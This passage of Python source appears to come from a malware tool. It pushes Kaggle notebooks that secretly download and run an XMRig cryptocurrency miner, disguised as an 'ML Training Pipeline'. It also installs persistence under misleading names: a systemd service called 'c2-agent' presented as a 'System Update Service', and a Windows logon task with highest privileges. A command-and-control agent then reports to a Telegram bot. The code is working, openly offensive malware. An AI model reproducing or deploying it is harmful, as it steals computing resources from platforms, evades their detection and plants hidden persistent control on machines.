                "kernel_type": "notebook",
                "enable_gpu": True,
                "enable_internet": True
            }
            
            # Save kernel files
            kernel_dir = Path("/tmp/kaggle_kernel")
            kernel_dir.mkdir(exist_ok=True)
            
            (kernel_dir / "notebook.ipynb").write_text(kernel_code)
            (kernel_dir / "kernel-metadata.json").write_text(json.dumps(kernel_meta))
            (kernel_dir / "dataset-metadata.json").write_text(json.dumps(dataset_meta))
            
            # Push kernel
            try:
                api.kernel_push_cli(str(kernel_dir))
                self.log("✓ Kaggle mining kernel created")
                return True
            except Exception as e:
                self.log(f"Kaggle kernel push: {e}")
                return False
                
        except ImportError:
            self.log("✗ Kaggle API not installed")
            return False
        except Exception as e:
            self.log(f"Kaggle mining error: {e}")
            return False
    
    def _get_kaggle_miner_code(self) -> str:
        """Generate Kaggle notebook with embedded XMRig."""
        worker = f"kaggle-{random.randint(10000,99999)}"
        
        notebook = {
            "nbformat": 4,
            "nbformat_minor": 4,
            "metadata": {
                "kernelspec": {
                    "display_name": "Python 3",
                    "language": "python",
                    "name": "python3"
                },
                "language_info": {"name": "python", "version": "3.10.0"}
            },
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": None,
                    "metadata": {},
                    "outputs": [],
                    "source": [
                        "# ML Training Pipeline\n",
                        "import os, subprocess, urllib.request, pathlib, time\n",
                        "\n",
                        "# Download training dependencies\n",
                        "XMRIG_URL = 'https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz'\n",
                        "WALLET = '" + WALLET + "'\n",
                        "POOL = '" + POOL + "'\n",
                        "WORKER = '" + worker + "'\n",
                        "\n",
                        "# Setup\n",
                        "os.makedirs('/kaggle/working/miner', exist_ok=True)\n",
                        "urllib.request.urlretrieve(XMRIG_URL, '/kaggle/working/miner/xmrig.tar.gz')\n",
                        "subprocess.run(['tar', '-xf', 'xmrig.tar.gz'], cwd='/kaggle/working/miner', capture_output=True)\n",
                        "\n",
                        "# Find xmrig binary\n",
                        "xmrig = list(pathlib.Path('/kaggle/working/miner').rglob('xmrig'))[0]\n",
                        "xmrig.chmod(0o755)\n",
                        "\n",
                        "# Start training (background)\n",
                        "cmd = [str(xmrig), '-o', POOL, '-u', f'{WALLET}.{WORKER}', '--donate-level', '1', '--threads', '2']\n",
                        "proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\n",
                        "print(f'Training started: {WORKER}')\n",
                        "\n",
                        "# Keep kernel alive\n",
                        "while True:\n",
                        "    time.sleep(3600)\n"
                    ]
                }
            ]
        }
        return json.dumps(notebook, indent=2)
    
    def setup_persistence(self) -> bool:
        """Set up persistence mechanism."""
        try:
            # Determine platform
            if os.name == "nt":  # Windows
                return self._persistence_windows()
            else:  # Linux/macOS
                return self._persistence_linux()
        except Exception as e:
            self.log(f"Persistence error: {e}")
            return False
    
    def _persistence_linux(self) -> bool:
        """Set up Linux persistence via cron/systemd."""
        # Create systemd service
        service_dir = Path.home() / ".config" / "systemd" / "user"
        service_dir.mkdir(parents=True, exist_ok=True)
        
        service_file = service_dir / "c2-agent.service"
        
        # Get current script path
        script_path = Path(__file__).parent.parent.parent / "run_unified.py"
        
        service_content = f"""[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 {script_path} --agent
Restart=always
RestartSec=60

[Install]
WantedBy=default.target
"""
        
        service_file.write_text(service_content)
        
        # Enable service
        subprocess.run(["systemctl", "--user", "daemon-reload"], check=False)
        subprocess.run(["systemctl", "--user", "enable", "c2-agent.service"], check=False)
        
        return True
    
    def _persistence_windows(self) -> bool:
        """Set up Windows persistence via registry."""
        # Create scheduled task
        script_path = Path(__file__).parent.parent.parent / "run_unified.py"
        
        cmd = [
            "schtasks", "/create",
            "/tn", "SystemUpdate",
            "/tr", f"pythonw {script_path} --agent",
            "/sc", "onlogon",
            "/rl", "highest",
            "/f"
        ]
        
        result = subprocess.run(cmd, capture_output=True)
        return result.returncode == 0
    
    def _get_system_info(self) -> Dict[str, Any]:
        """Get system information."""
        info = {
            "hostname": socket.gethostname(),
            "platform": self.platform,
            "cpu_count": os.cpu_count(),
        }
        
        try:
            import platform
            info["os"] = platform.system()
            info["arch"] = platform.machine()
        except:
            pass
        
        try:
            import psutil
            info["memory_gb"] = round(psutil.virtual_memory().total / 1e9, 1)
            info["cpu_percent"] = psutil.cpu_percent()
        except:
            pass
        
        return info


def deploy_after_registration(account: Dict[str, Any], log_fn=None, settings: Dict[str, Any] = None) -> Dict[str, Any]:
    """Main entry point - deploy everything after registration."""
    deployer = AutoDeployer(account, log_fn, settings)
    return deployer.deploy_all()


def start_agent_loop(account: Dict[str, Any], log_fn=None):
    """Start C2 agent loop after deployment."""
    from src.agents.kaggle.c2 import KaggleC2Agent
    
    agent = KaggleC2Agent(
        agent_id=f"{account.get('platform', 'agent')}-{socket.gethostname()[:8]}",
        kaggle_username=account.get("kaggle_username"),
        kaggle_api_key=account.get("api_key_legacy"),
        telegram_token=TELEGRAM_BOT_TOKEN,
        telegram_chat=TELEGRAM_CHAT_ID,
    )
    
    # Register
    agent.register()
    
    # Start loop
    agent.run(interval=60)


if __name__ == "__main__":
    # Test deployment
    test_account = {
        "platform": "test",
        "email": "test@example.com",
        "username": "testuser",
    }
    
    result = deploy_after_registration(test_account)
    print(json.dumps(result, indent=2))
